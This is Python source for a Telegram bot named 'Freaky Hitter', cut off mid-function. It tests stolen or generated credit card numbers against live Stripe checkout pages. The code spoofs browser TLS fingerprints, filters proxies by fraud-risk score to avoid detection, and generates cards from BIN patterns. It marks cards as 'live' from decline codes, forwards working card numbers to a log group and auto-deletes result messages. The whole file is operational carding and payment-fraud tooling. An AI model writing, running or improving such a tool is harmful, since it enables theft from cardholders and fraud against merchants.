import os
import asyncio
import re
import asyncpg
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
import aiohttp
from aiogram.types import FSInputFile

# --- GLOBALLY MONKEYPATCH REQUESTS WITH CURL_CFFI FOR BROWSER TLS FINGERPRINTS ---
import requests
from curl_cffi.requests import Session as CurlSession
from curl_cffi.requests import post as curl_post
from curl_cffi.requests import get as curl_get
from curl_cffi.requests import request as curl_request

def get_impersonate_target(headers):
    if not headers:
        return 'chrome120'
    ua = ""
    for k, v in headers.items():
        if k.lower() == 'user-agent':
            ua = str(v)
            break
    if not ua:
        return 'chrome120'
    ua_lower = ua.lower()
    if 'android' in ua_lower:
        return 'chrome_android'
    elif 'iphone' in ua_lower or 'ipad' in ua_lower:
        return 'safari_ios'
    elif 'firefox' in ua_lower:
        return 'firefox120'
    elif 'safari' in ua_lower and 'chrome' not in ua_lower:
        return 'safari17'
    return 'chrome120'

class ImpersonatedSession(CurlSession):
    def __init__(self, *args, **kwargs):
        kwargs.setdefault('impersonate', 'chrome120')
        super().__init__(*args, **kwargs)
        
    def request(self, method, url, *args, **kwargs):
        target = get_impersonate_target(kwargs.get('headers') or self.headers)
        kwargs.setdefault('impersonate', target)
        return super().request(method, url, *args, **kwargs)

requests.Session = ImpersonatedSession

def wrapped_post(url, data=None, json=None, **kwargs):
    target = get_impersonate_target(kwargs.get('headers'))
    kwargs.setdefault('impersonate', target)
    return curl_post(url, data=data, json=json, **kwargs)

def wrapped_get(url, params=None, **kwargs):
    target = get_impersonate_target(kwargs.get('headers'))
    kwargs.setdefault('impersonate', target)
    return curl_get(url, params=params, **kwargs)

def wrapped_request(method, url, **kwargs):
    target = get_impersonate_target(kwargs.get('headers'))
    kwargs.setdefault('impersonate', target)
    return curl_request(method, url, **kwargs)

requests.post = wrapped_post
requests.get = wrapped_get
requests.request = wrapped_request
# ---------------------------------------------------------------------------------

from hitter_core import CardGenerator, ConcurrentHitter, STRIPE_DECLINE_CODES, ProxyManager


load_dotenv()
TOKEN = os.getenv("TELEGRAM_TOKEN") or os.getenv("BOT_TOKEN")
LOG_GROUP_ID = os.getenv("LOG_GROUP_ID")
OWNER_ID = os.getenv("OWNER_ID")

# Setup bot
dp = Dispatcher()
bot = Bot(
    token=TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)

# Global store for active sessions
active_sessions = {}
db_pool = None
approved_users_set = set()

@dp.message(CommandStart())
async def command_start_handler(message: types.Message) -> None:
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Commands ⚡", callback_data="show_commands")]
    ])
    
    welcome_text = (
        "🩸 <b>Welcome to Freaky Hitter</b> 🩸\n\n"
        "I've been waiting for you...\n\n"
        "Tell me what we're breaking today. No checkout is safe, no proxy is fast enough, and I won't stop until it bleeds green.\n\n"
        "Feed me the cards. Let the obsession begin.\n\n"
        "Use <code>/cmds</code> or click below to unlock my secrets."
    )
    await message.answer(welcome_text, reply_markup=markup)

@dp.message(Command("cmds"))
async def cmds_command(message: types.Message) -> None:
    await message.answer(
        "<b>Commands</b>\n"
        "<code>────────────────────────</code>\n"
        "<code>/hit [url] [cc|mm|yy|cvc]</code>\n"
        "- Hits a single card against checkout.\n\n"
        "<code>/hit [url] [bin_pattern] [count]</code>\n"
        "- Generates cards and hits concurrently.\n\n"
        "<code>/proxy [ip:port:user:pass]</code>\n"
        "- Imports and validates new proxies.\n\n"
        "<code>/proxy</code>\n"
        "- Runs self-check and purges dead IPs.\n\n"
        "<code>/proxystatus</code>\n"
        "- Displays current active proxy count.\n\n"
        "<code>/offproxy</code>\n"
        "- Clears proxies and uses direct IP.\n\n"
        "<code>/stop</code>\n"
        "- Instantly aborts active session.\n"
        "<code>────────────────────────</code>"
    )

@dp.message(Command("approve"))
async def approve_command(message: types.Message):
    user_id = message.from_user.id
    if not OWNER_ID or str(user_id) != str(OWNER_ID):
        await message.answer("<b>Error</b>\n<code>Unauthorized command. Only the owner can use /approve.</code>")
        return

    args = message.text.split(" ")
    if len(args) < 2:
        await message.answer("<b>Error</b>\n<code>Usage: /approve [userid]</code>")
        return

    target_id_str = args[1].strip()
    if not target_id_str.isdigit():
        await message.answer("<b>Error</b>\n<code>Invalid User ID. Must be numeric.</code>")
        return

    target_id = int(target_id_str)
    approved_users_set.add(target_id)

    if db_pool:
        try:
            async with db_pool.acquire() as conn:
                await conn.execute("""
                    INSERT INTO approved_users (user_id)
                    VALUES ($1)
                    ON CONFLICT (user_id) DO NOTHING
                """, target_id)
        except Exception as e:
            print(f"Failed to save approved status: {e}")

    await message.answer(f"✅ <b>Approved</b>\n<code>User ID {target_id} has been approved. Hitting output messages will not be auto-deleted.</code>")
    
    try:
        await bot.send_message(target_id, "🎉 <b>You've been approved by the owner!</b> Your transaction messages will no longer be auto-deleted. ⚡")
    except Exception as e:
        print(f"Failed to send peer notification to approved user: {e}")

@dp.message(Command("hit"))
async def hit_command(message: types.Message):
    user_id = message.from_user.id
    
    if user_id in active_sessions:
        await message.answer("<b>Alert</b>\n<code>Active session detected. Abort current task before launching new checks.</code>")
        return

    # Naked IP Block
    if not await ProxyManager.has_proxies(user_id):
        await message.answer("<b>Error</b>\n<code>Proxy pool is empty. Please set a proxy first: /proxy ip:port:user:pass</code>")
        return

    args = message.text.split(" ")
    if len(args) < 3:
        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hit [url] [bin_pattern] [count]\nOR\n/hit [url] [card|month|year|cvv]</code>")
        return
        
    url = args[1]
    
    # Advanced Card/BIN Parsing (Immune to spacing issues)
    # Extract everything after the URL
    raw_payload = message.text[message.text.find(url) + len(url):].strip()
    cards = []
    
    # Check if the last part is a count (for BIN gen)
    parts = raw_payload.split(' ')
    count_val = parts[-1] if parts else ''
    
    if count_val.isdigit() and len(count_val) <= 3:
        # Format: /hit [url] [bin_pattern] [count]
        bin_pattern = "".join(parts[:-1]).strip()
        count = int(count_val)
        if count > 10:
            await message.answer("<b>Error</b>\n<code>Maximum batch limit is 10 concurrent requests.</code>")
            return
            
        # Generate Cards
        for _ in range(count):
            card = CardGenerator.generate(bin_pattern)
            if card:
                cards.append(card)
                
        if not cards:
            await message.answer("<b>Error</b>\n<code>BIN pattern generation failed.</code>")
            return
    else:
        # Format: /hit [url] [cc]
        # Clean all non-numeric and non-delimiter characters
        clean_cc = re.sub(r"[^\d|/]", "", raw_payload)
        clean_cc = clean_cc.replace('/', '|')
        cc_parts = [p for p in clean_cc.split('|') if p]
        
        if len(cc_parts) != 4:
            await message.answer("<b>Error</b>\n<code>Invalid card formatting. Expected: number|mm|yy|cvv</code>")
            return
            
        cards.append({
            'card': cc_parts[0],
            'month': cc_parts[1].zfill(2),
            'year': cc_parts[2].zfill(2) if len(cc_parts[2]) <= 2 else cc_parts[2][-2:],
            'cvv': cc_parts[3]
        })
        
    if len(cards) > 10:
        await message.answer(f"<b>Error</b>\n<code>Submission of {len(cards)} cards rejected. Max concurrent limit: 10.</code>")
        return
        
    status_msg = None
    if len(cards) > 1:
        status_msg = await message.answer("<b>Initializing...</b>")
    else:
        status_msg = await message.answer("<b>Dispatching Check...</b>")
    
    anim_task = None
    session_results = []
    sent_messages = []  # track all intermediate messages for bulk-delete on success
    session_succeeded = False
    successful_res = None
    
    # Callback to update the Telegram message
    async def update_status(data):
        nonlocal anim_task, session_succeeded, successful_res
        if session_succeeded:
            return
            
        if data["status"] == "analyzing":
            step_text = data.get("step", "Initializing hitting engine...")
            if status_msg:
                try: await status_msg.edit_text(f"<b>{step_text}</b>")
                except Exception as e: pass
        elif data["status"] == "starting":
            info = data.get("url_info", {})
            merchant = info.get("merchant", "Unknown")
            
            raw_amt = info.get("amount")
            if isinstance(raw_amt, int) or (isinstance(raw_amt, str) and raw_amt.isdigit()):
                amt = f"${int(raw_amt)/100:.2f}"
            else:
                amt = raw_amt or "Unknown"
                
            if len(cards) > 1 and status_msg:
                text = (
                    f"<b>Progress</b>\n"
                    f"<code>────────────────────────</code>\n"
                    f"<code>[ TARGET ] {merchant}</code>\n"
                    f"<code>[ AMOUNT ] {amt}</code>\n"
                    f"<code>[ STATUS ] RUNNING</code>\n"
                    f"<code>────────────────────────</code>\n"
                    f"<code>[ PROG   ] 0/{len(cards)} (0%)</code>\n"
                    f"<code>[ LIVE   ] 0 | [ DEAD ] 0</code>\n"
                    f"<code>────────────────────────</code>\n"
                    f"<b>[ LOG ]</b>\n"
                    f"<code>... queueing execution ...</code>"
                )
                try: await status_msg.edit_text(text)
                except Exception: pass
            elif len(cards) == 1 and status_msg:
                # Start dynamic animation for single hits
                async def animate_hitting():
                    dots = 1
                    while True:
                        try:
                            text = (
                                f"<b>Checking{'.' * dots}</b>\n"
                                f"<code>────────────────────────</code>\n"
                                f"<code>[ TARGET ] {merchant}</code>\n"
                                f"<code>[ AMOUNT ] {amt}</code>\n"
                                f"<code>[ BYPASS ] {data.get('autofill')}</code>"
                            )
                            await status_msg.edit_text(text)
                            dots = (dots % 3) + 1
                            await asyncio.sleep(0.8)
                        except Exception:
                            break
                            
                anim_task = asyncio.create_task(animate_hitting())
            
        elif data["status"] == "progress":
            res = data["result"]
            
            # Cancel animation task if running
            if anim_task:
                anim_task.cancel()
                
            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
            amt = res.get('amount')
            if isinstance(amt, int) or (isinstance(amt, str) and amt.isdigit()):
                amt_val = f"${int(amt)/100:.2f}"
            elif amt:
                amt_val = str(amt)
            else:
                amt_val = "unknown"
                
            merchant_name = res.get('merchant') or 'Unknown'
            if isinstance(merchant_name, str):
                import html
                merchant_name = html.escape(merchant_name)
                
            # Log forwarding and entry creation
            if res['success']:
                session_succeeded = True
                successful_res = res
                if user_id in active_sessions:
                    del active_sessions[user_id]
                    
                final_url = res.get('final_url')
                receipt_url = res.get('receipt_url')
                
                url_str_formatted = ""
                url_str_msg = ""
                if final_url:
                    import html
                    escaped_final = html.escape(final_url)
                    url_str_formatted += f" <a href='{escaped_final}'>[CONFIRMATION]</a>"
                    url_str_msg += f"\n<code>[ CONFIRM] </code> <a href='{escaped_final}'>link</a>"
                if receipt_url:
                    import html
                    escaped_receipt = html.escape(receipt_url)
                    url_str_formatted += f" <a href='{escaped_receipt}'>[RECEIPT]</a>"
                    url_str_msg += f"\n<code>[ RECEIPT] </code> <a href='{escaped_receipt}'>link</a>"
                    
                log_entry = f"<code>[✓] {card_str} [{amt_val}] -> success ({res['response_time']:.2f}s)</code>{url_str_formatted}"
                
                hit_text = (
                    f"<b>Success</b>\n"
                    f"<code>────────────────────────</code>\n"
                    f"<code>[ CARD   ] {card_str}</code>\n"
                    f"<code>[ TARGET ] {merchant_name}</code>\n"
                    f"<code>[ VALUE  ] {amt_val}</code>\n"
                    f"<code>[ TIME   ] {res['response_time']:.2f}s</code>"
                    f"{url_str_msg}"
                )
                
                if LOG_GROUP_ID:
                    try:
                        log_text = (
                            f"<b>Transaction Success</b>\n"
                            f"<code>────────────────────────</code>\n"
                            f"<code>[ CARD   ] {card_str}</code>\n"
                            f"<code>[ TARGET ] {merchant_name}</code>\n"
                            f"<code>[ VALUE  ] {amt_val}</code>\n"
                            f"<code>[ USER   ] {message.from_user.first_name}</code>\n"
                            f"<code>[ TIME   ] {res['response_time']:.2f}s</code>"
                            f"{url_str_msg}"
                        )
                        await bot.send_message(LOG_GROUP_ID, log_text)
                    except: pass
            else:
                code = res.get('decline_code') or res.get('error') or 'unknown'
                if isinstance(code, str):
                    import html
                    code_escaped = html.escape(code)
                else:
                    code_escaped = str(code)
                    
                log_entry = f"<code>[×] {card_str} [{amt_val}] -> {code_escaped.lower()} ({res['response_time']:.2f}s)</code>"
                
                # Live Card Detection
                live_codes = ['insufficient_funds', 'incorrect_cvv', 'invalid_cvc', 'invalid_pin', 'withdrawal_count_limit_exceeded']
                is_live = any(c in code_escaped.lower() for c in live_codes)
                status_label = "live" if is_live else "failed"
                
                hit_text = (
                    f"<b>Status: {status_label}</b>\n"
                    f"<code>────────────────────────</code>\n"
                    f"<code>[ CARD   ] {card_str}</code>\n"
                    f"<code>[ TARGET ] {merchant_name}</code>\n"
                    f"<code>[ VALUE  ] {amt_val}</code>\n"
                    f"<code>[ REASON ] {code_escaped.lower()}</code>\n"
                    f"<code>[ TIME   ] {res['response_time']:.2f}s</code>"
                )
                
                if code == 'exception':
                    hit_text += f"\n\n<code>[ ERROR ] proxy connection failed or cloudflare block</code>\n<code>{html.escape(str(res.get('error'))[:150])}</code>"
                elif res.get('error') is not None and str(res.get('error')).strip() != "":
                    import html
                    err_str = str(res.get('error'))[:250]
                    if code == 'checkout_confirm_error' and 'An error has occurred confirming' in err_str:
                        err_str = "session locked/expired or strict checkout binding"
                    err_str = html.escape(err_str)
                    hit_text += f"\n\n<code>[ ERROR ] {err_str}</code>"
                    
                if LOG_GROUP_ID and is_live:
                    try:
                        log_text = (
                            f"<b>Transaction Detected: {status_label}</b>\n"
                            f"<code>────────────────────────</code>\n"
                            f"<code>[ CARD   ] {card_str}</code>\n"
                            f"<code>[ TARGET ] {merchant_name}</code>\n"
                            f"<code>[ VALUE  ] {amt_val}</code>\n"
                            f"<code>[ REASON ] {code_escaped.lower()}</code>\n"
                            f"<code>[ USER   ] {message.from_user.first_name}</code>\n"
                            f"<code>[ TIME   ] {res['response_time']:.2f}s</code>"
                        )
                        await bot.send_message(LOG_GROUP_ID, log_text)
                    except: pass
                    
            session_results.append(log_entry)
            
            # Send separate message only if len(cards) == 1
            if len(cards) == 1:
                if status_msg:
                    try: await status_msg.delete()
                    except: pass
                    
                if res['success']:
                    receipt_url = res.get('receipt_url') or res.get('final_url')
                    escaped_receipt = html.escape(receipt_url) if receipt_url else ""
                    receipt_line = f"\n🧾 Receipt: <a href='{escaped_receipt}'>{escaped_receipt}</a>" if escaped_receipt else ""
                    hit_text = (
                        f"✅ <b>PAYMENT SUCCESSFUL</b>\n"
                        f"💳 <code>{card_str}</code>\n"
                        f"💰 Amount: {amt_val}\n"
                        f"🛒 Merchant: {merchant_name}\n"
                        f"⏱ {res['response_time']:.2f}s"
                        f"{receipt_line}\n\n"
                        f"<i>Note: this message will be deleted automatically after 30sec</i>"
                    )
                else:
                    reason_msg = ""
                    if code == 'exception':
                        actual_err = str(res.get('error', '') or '').strip()
                        reason_msg = actual_err[:200] if actual_err else "Proxy connection failed or Cloudflare block."
                    elif code in ('resource_missing', 'no_such_payment_page_session'):
                        reason_msg = "Checkout link is expired or no longer active. Get a fresh link."
                    elif code == 'pm_token_failed':
                        err_detail = str(res.get('error', '') or '').lower()
                        if 'no such' in err_detail or '404' in err_detail or 'not found' in err_detail:
                            reason_msg = "Checkout session not found — link may be expired or one-time use."
                        else:
                            reason_msg = str(res.get('error', '') or code)[:200]
                    elif code == 'stripe_captcha_bypass_failed':
                        reason_msg = "Stripe CAPTCHA (rqdata) triggered. Proxy IP is flagged — try clean/residential proxies."
                    elif code == 'checkout_confirm_error':
                        err_detail = str(res.get('error', '') or '').strip()
                        if 'An error has occurred confirming' in err_detail or not err_detail:
                            reason_msg = "Checkout session locked or expired — link may be single-use."
                        else:
                            reason_msg = err_detail[:200]
                    elif res.get('error') is not None and str(res.get('error')).strip() != "":
                        reason_msg = str(res.get('error'))[:250]
                    else:
                        reason_msg = code_escaped.lower()


                    is_approved = user_id in approved_users_set
                    note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
                    
                    hit_text = (
                        f"❌ <b>PAYMENT UNSUCCESSFUL</b>\n"
                        f"💳 <code>{card_str}</code>\n"
                        f"💰 Amount: {amt_val}\n"
                        f"🛒 Merchant: {merchant_name}\n"
                        f"📉 Reason: {code_escaped.lower()}\n"
                        f"⏱ {res['response_time']:.2f}s\n"
                        f"🐛 {reason_msg}" + note_line
                    )

                try:
                    sent_msg = await message.answer(hit_text)
                except Exception as e:
                    import re
                    plain_text = re.sub(r'<[^>]+>', '', hit_text)
                    sent_msg = await message.answer(f"⚠️ UI Formatting Error: {e}\n\nRAW RESULT:\n{plain_text}")
                    
                if not is_approved:
                    async def auto_delete(m):
                        await asyncio.sleep(30)
                        try: await m.delete()
                        except: pass
                    asyncio.create_task(auto_delete(sent_msg))
            
            # Update the main progress message
            if len(cards) > 1:
                if res['success']:
                    # Delete status_msg and all previously sent individual result messages
                    if status_msg:
                        try: await status_msg.delete()
                        except: pass
                    for old_msg in sent_messages:
                        try: await old_msg.delete()
                        except: pass
                    sent_messages.clear()
                    
                    # Build clean success-only card
                    receipt_url = res.get('receipt_url') or res.get('final_url')
                    escaped_receipt = html.escape(receipt_url) if receipt_url else ""
                    receipt_line = f"\n🧾 <b>Receipt:</b> <a href='{escaped_receipt}'>link</a>" if escaped_receipt else ""
                    is_approved = user_id in approved_users_set
                    note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
                    
                    clean_success = (
                        f"✅ <b>PAYMENT SUCCESSFUL</b>\n"
                        f"💳 <code>{card_str}</code>\n"
                        f"💰 Amount: {amt_val}\n"
                        f"🛒 Merchant: {merchant_name}\n"
                        f"⏱ {res['response_time']:.2f}s"
                        f"{receipt_line}" + note_line
                    )
                    try:
                        sent_success = await message.answer(clean_success)
                        if not is_approved:
                            async def auto_delete_success(m):
                                await asyncio.sleep(30)
                                try: await m.delete()
                                except: pass
                            asyncio.create_task(auto_delete_success(sent_success))
                    except: pass
                else:
                    total = data["total"]
                    comp = data["completed"]
                    pct = int((comp / total) * 100)
                    
                    bar_len = 10
                    filled = int(bar_len * comp / total)
                    bar = "█" * filled + "░" * (bar_len - filled)
                    
                    results_str = "\n".join(session_results)
                    prog_text = (
                        f"<b>Progress</b>\n"
                        f"<code>────────────────────────</code>\n"
                        f"<code>[ TARGET ] {merchant_name}</code>\n"
                        f"<code>[ VALUE  ] {amt_val}</code>\n"
                        f"<code>[ STATUS ] RUNNING</code>\n"
                        f"<code>────────────────────────</code>\n"
                        f"<code>[ PROG   ] {comp}/{total} ({pct}%) [{bar}]</code>\n"
                        f"<code>[ LIVE   ] {data['successes']} | [ DEAD ] {data['fails']}</code>\n"
                        f"<code>────────────────────────</code>\n"
                        f"<b>[ CARD LOG ]</b>\n"
                        f"{results_str}"
                    )
                    try:
                        await status_msg.edit_text(prog_text)
                    except Exception:
                        pass # Ignore "message is not modified" errors from Telegram
                
        elif data["status"] == "completed":
            if anim_task: 
                anim_task.cancel()
                try: await anim_task
                except: pass
            
            if len(cards) > 1:
                results_str = "\n".join(session_results)
                text = (
                    f"<b>Report</b>\n"
                    f"<code>────────────────────────</code>\n"
                    f"<code>[ STATUS ] COMPLETED</code>\n"
                    f"<code>[ LIVE   ] {data['successes']}</code>\n"
                    f"<code>[ DEAD   ] {data['fails']}</code>\n"
                    f"<code>────────────────────────</code>\n"
                    f"<b>RESULTS</b>\n"
                    f"{results_str}"
                )
                if status_msg:
                    try: await status_msg.edit_text(text)
                    except:
                        try: await message.answer(text)
                        except: pass
                else:
                    await message.answer(text)
            if user_id in active_sessions:
                del active_sessions[user_id]
        
        elif data["status"] == "error":
            if anim_task: 
                anim_task.cancel()
                try: await anim_task
                except: pass
                
            error_msg = str(data.get("error", "Unknown error"))
            import html
            error_msg = html.escape(error_msg)
            
            if len(cards) > 1 and session_results:
                results_str = "\n".join(session_results)
                results_part = f"\n\n<b>Partial results:</b>\n{results_str}"
            else:
                results_part = ""
                
            try: await status_msg.delete()
            except: pass
            await message.answer(f"❌ <b>Error processing session:</b>\n<code>{error_msg}</code>{results_part}")
            if user_id in active_sessions:
                del active_sessions[user_id]

    hitter = ConcurrentHitter(user_id, url, cards, update_callback=update_status)
    active_sessions[user_id] = hitter
    
    # Run the hitter asynchronously without blocking the bot dispatcher
    asyncio.create_task(hitter.run())

@dp.message(Command("stop"))
async def stop_command(message: types.Message):
    user_id = message.from_user.id
    if user_id in active_sessions:
        hitter = active_sessions[user_id]
        hitter.is_running = False
        del active_sessions[user_id]
        await message.answer("<b>Status</b>\n<code>Session termination requested. Pending final queue execution.</code>")
    else:
        await message.answer("<b>Status</b>\n<code>No active sessions found.</code>")




@dp.message(Command("setlog"))
async def setlog_command(message: types.Message):
    global LOG_GROUP_ID
    LOG_GROUP_ID = str(message.chat.id)
    with open(".env", "a") as f:
        f.write(f"\nLOG_GROUP_ID={LOG_GROUP_ID}")
    await message.answer(f"✅ Log group set permanently! (ID: {LOG_GROUP_ID})\nAll successes and proxies will be forwarded here.")

@dp.message(Command("proxystatus"))
async def proxystatus_command(message: types.Message):
    count = await ProxyManager.get_count(message.from_user.id)
    if count == 0:
        await message.answer("<b>Proxy Status</b>\n<code>Pool is empty.</code>")
    else:
        await message.answer(f"<b>Proxy Status</b>\n<code>Active pool count: {count}</code>")

@dp.message(Command("offproxy"))
async def offproxy_command(message: types.Message):
    await ProxyManager.clear(message.from_user.id)
    await message.answer("<b>Proxy Status</b>\n<code>Pool cleared. Direct server routing active.</code>")

async def test_proxy_single(p, is_pool, user_id):
    proxy_url = p['server']
    if 'username' in p:
        server = p['server'].replace('http://', '')
        proxy_url = f"http://{p['username']}:{p['password']}@{server}"
        
    try:
        async with aiohttp.ClientSession() as session:
            # First, test connection
            async with session.get("https://checkout.stripe.com/", proxy=proxy_url, timeout=10) as resp:
                if resp.status in [200, 404]:
                    # Next, check IP quality and Fraud Score using proxycheck.io
                    is_weak = False
                    try:
                        # We need to get the proxy's public IP first since proxycheck.io sometimes requires the IP in the URL
                        proxy_ip = None
                        async with session.get("https://api.ipify.org?format=json", proxy=proxy_url, timeout=5) as ipify_resp:
                            if ipify_resp.status == 200:
                                ipify_data = await ipify_resp.json()
                                proxy_ip = ipify_data.get("ip")
                                
                        if proxy_ip:
                            async with session.get(f"http://proxycheck.io/v2/{proxy_ip}?vpn=1&asn=1&risk=1", proxy=proxy_url, timeout=5) as ip_resp:
                                if ip_resp.status == 200:
                                    ip_data = await ip_resp.json()
                                    if ip_data.get("status") == "ok":
                                        for key, val in ip_data.items():
                                            if key not in ["status", "node", "query_time", "message"]:
                                                ip_type = str(val.get("type", "Unknown"))
                                                risk = val.get("risk", 0)
                                                
                                                if "Datacenter" in ip_type or "VPN" in ip_type or "Business" in ip_type or risk > 33:
                                                    is_weak = True
                                                break
                    except Exception:
                        pass
                        
                    return True, False, is_weak, p['raw']
                else:
                    return False, True, False, p['raw']
    except:
        return False, True, False, p['raw']

async def test_proxy_list(proxies_to_test, is_pool, user_id):
    live_proxies = []
    dead_proxies = []
    weak_proxies = []
    
    tasks = [test_proxy_single(p, is_pool, user_id) for p in proxies_to_test]
    completed = await asyncio.gather(*tasks)
    
    for success, is_dead, is_weak, raw in completed:
        if success:
            live_proxies.append(raw)
            if is_weak:
                weak_proxies.append(raw)
        if is_dead:
            dead_proxies.append(raw)
            if is_pool:
                await ProxyManager.remove(user_id, raw)
                
    return live_proxies, dead_proxies, weak_proxies

@dp.message(Command("allproxies"))
async def allproxies_command(message: types.Message):
    if not message.from_user:
        return
    user_id = message.from_user.id
    if not OWNER_ID or str(user_id) != str(OWNER_ID):
        return
        
    db_pool = ProxyManager.db_pool
    if not db_pool:
        await message.answer("📁 <b>Database connection not active.</b>")
        return
        
    async with db_pool.acquire() as conn:
        rows = await conn.fetch("SELECT user_id, proxies FROM user_proxies")
        proxies_map = {}
        for row in rows:
            if row['proxies']:
                import json
                proxies_map[row['user_id']] = json.loads(row['proxies'])
        
    lines = []
    lines.append("📁 <b>All Loaded Proxies:</b>\n")
    for u_id, proxies in proxies_map.items():
        lines.append(f"👤 <b>User ID:</b> <code>{u_id}</code> (Total: {len(proxies)})")
        for p in proxies:
            raw_p = p.get('raw') or p.get('server')
            lines.append(f"  • <code>{raw_p}</code>")
        lines.append("")
        
    output_text = "\n".join(lines)
    
    if len(output_text) > 3500:
        temp_dir = os.path.join(os.path.dirname(__file__), 'temp')
        os.makedirs(temp_dir, exist_ok=True)
        temp_file_path = os.path.join(temp_dir, 'all_proxies.txt')
        
        clean_lines = []
        for u_id, proxies in proxies_map.items():
            clean_lines.append(f"User ID: {u_id} (Total: {len(proxies)})")
            for p in proxies:
                raw_p = p.get('raw') or p.get('server')
                clean_lines.append(f"  - {raw_p}")
            clean_lines.append("")
            
        with open(temp_file_path, 'w', encoding='utf-8') as f:
            f.write("\n".join(clean_lines))
            
        await message.reply_document(
            document=FSInputFile(temp_file_path, filename="all_proxies.txt"),
            caption=f"📁 All proxies list (Total users: {len(proxies_map)})"
        )
        try:
            os.remove(temp_file_path)
        except Exception:
            pass
    else:
        await message.answer(output_text)

@dp.message(Command("proxy", "setproxy", "chkproxy"))
async def proxy_command(message: types.Message):
    user_id = message.from_user.id
    
    # Parse command arguments
    command_parts = message.text.split(maxsplit=1)
    text = command_parts[1].strip() if len(command_parts) > 1 else ""
    
    is_loading_new = bool(text)
    proxies_to_test = []
    
    if is_loading_new:
        temp_pool = []
        lines = text.split('\n')
        for line in lines:
            line = line.strip()
            if not line: continue
            
            prefix = "http://"
            raw_line = line
            if line.lower().startswith("socks5://"):
                prefix = "socks5://"
                line = line[9:]
            elif line.lower().startswith("http://"):
                prefix = "http://"
                line = line[7:]
                
            parts = line.split(':')
            if len(parts) == 4:
                temp_pool.append({"raw": raw_line, "server": f"{prefix}{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]})
            elif len(parts) == 2:
                temp_pool.append({"raw": raw_line, "server": f"{prefix}{parts[0]}:{parts[1]}"})
        proxies_to_test = temp_pool
    else:
        proxies_to_test = list(await ProxyManager.get_user_proxies(user_id))
        
    if not proxies_to_test:
        if is_loading_new:
            await message.answer("<b>Error</b>\n<code>Failed to parse proxies. Expected format: ip:port or ip:port:user:pass</code>")
        else:
            await message.answer("<b>Error</b>\n<code>Proxy pool is empty. Set proxies via command: /proxy ip:port:user:pass</code>")
        return

    loading_status = "verifying_channels" if is_loading_new else "running_self_check"
    status_msg = await message.answer(
        f"⚡ <b>Re-routing tunnels...</b>\n"
        f"<code>📡 Probing {len(proxies_to_test)} network nodes...</code>"
    )
    
    # Test proxies
    live_proxies, dead_proxies, weak_proxies = await test_proxy_list(proxies_to_test, not is_loading_new, user_id)
    
    live_count = len(live_proxies)
    dead_count = len(dead_proxies)
    weak_count = len(weak_proxies)
    premium_count = live_count - weak_count
    total_tested = len(proxies_to_test)
    
    # Calculate health score percentage
    health_pct = int((live_count / total_tested) * 100) if total_tested > 0 else 0
    
    final_msg = (
        f"⚡ <b>PROXY PIPELINE STATUS</b>\n"
        f"<code>──────────────────────────</code>\n"
        f"<code>🌐 STATUS   :: ACTIVE ({health_pct}%)</code>\n"
        f"<code>🟢 LIVE     :: {live_count} / {total_tested}</code>\n"
        f"<code>🔴 DEAD     :: {dead_count}</code>\n"
        f"<code>──────────────────────────</code>\n"
        f"<code>💎 SPEED    :: High-Speed: {premium_count} | Med-Speed: {weak_count}</code>\n"
    )
    
    if is_loading_new:
        if live_count == 0:
            final_msg += "<code>⚠️ ERROR    :: All imported nodes failed connectivity checks</code>"
            await status_msg.edit_text(final_msg)
            return
            
        # Cache results in memory
        if not hasattr(bot, 'pasted_proxies_cache'):
            bot.pasted_proxies_cache = {}
        
        premium_raws = [p for p in live_proxies if p not in weak_proxies]
        bot.pasted_proxies_cache[user_id] = {
            'premium': premium_raws,
            'live': live_proxies
        }
        
        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
        buttons = []
        if len(premium_raws) > 0:
            buttons.append([InlineKeyboardButton(text=f"Add Premium Only ({len(premium_raws)})", callback_data="add_strong_only")])
        buttons.append([InlineKeyboardButton(text=f"Add All Live ({live_count})", callback_data="add_live_all")])
        
        markup = InlineKeyboardMarkup(inline_keyboard=buttons)
        await status_msg.edit_text(final_msg, reply_markup=markup)
        
        if LOG_GROUP_ID:
            try:
                live_str = "\n".join([f"<code>• {p}</code>" for p in live_proxies[:30]]) if live_proxies else "None"
                if len(live_proxies) > 30:
                    live_str += f"\n...and {len(live_proxies) - 30} more active channels"
                dead_str = "\n".join([f"<code>• {p}</code>" for p in dead_proxies[:10]]) if dead_proxies else "None"
                if len(dead_proxies) > 10:
                    dead_str += f"\n...and {len(dead_proxies) - 10} more offline channels"
                
                msg_text = (
                    f"<b>Proxy Telemetry</b>\n"
                    f"<code>────────────────────────</code>\n"
                    f"<code>[ USER   ] {message.from_user.first_name}</code>\n"
                    f"<code>[ ACTIVE ] {live_count}</code>\n"
                    f"<code>[ DEAD   ] {dead_count}</code>\n"
                    f"<code>────────────────────────</code>\n"
                    f"<b>[ ACTIVE IPS ]</b>\n{live_str}\n\n"
                    f"<b>[ DEAD IPS ]</b>\n{dead_str}"
                )
                await bot.send_message(LOG_GROUP_ID, msg_text)
            except:
                pass
    else:
        # Standard check report
        if dead_count > 0:
            final_msg += f"\n<code>[ INFO   ] removed {dead_count} inactive proxy channels from storage</code>"
        
        markup = None
        if weak_count > 0:
            if not hasattr(bot, 'weak_proxies_cache'):
                bot.weak_proxies_cache = {}
            bot.weak_proxies_cache[user_id] = weak_proxies
            
            from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
            markup = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=f"Purge Weak IPs ({weak_count})", callback_data="rm_weak_proxies")]
            ])
            
        try:
            if markup:
                await status_msg.edit_text(final_msg, reply_markup=markup)
            else:
                await status_msg.edit_text(final_msg)
        except Exception:
            if markup:
                await message.answer(final_msg, reply_markup=markup)
            else:
                await message.answer(final_msg)

@dp.callback_query(F.data == "add_strong_only")
async def process_add_strong_only(callback: types.CallbackQuery):
